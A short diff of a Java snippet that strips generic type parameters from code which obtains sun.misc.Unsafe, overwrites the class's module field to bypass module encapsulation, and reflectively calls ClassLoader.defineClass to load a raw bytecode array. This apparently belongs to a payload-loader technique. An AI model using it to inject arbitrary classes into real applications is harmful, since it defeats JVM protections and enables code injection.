@@ -4,7 +4,7 @@
     long offset = 48;
     java.lang.reflect.Method getAndSetObjectM = null;
     try {
-        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
+        Class unsafeClass = Class.forName("sun.misc.Unsafe");
         java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
         unsafeField.setAccessible(true);
         unsafe = unsafeField.get(null);
@@ -28,7 +28,7 @@
     }
     java.lang.reflect.Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
     defMethod.setAccessible(true);
-    Class<?> clazz = (Class<?>) defMethod.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);
+    Class clazz = (Class) defMethod.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);
     if (getAndSetObjectM != null) {
         getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
     }
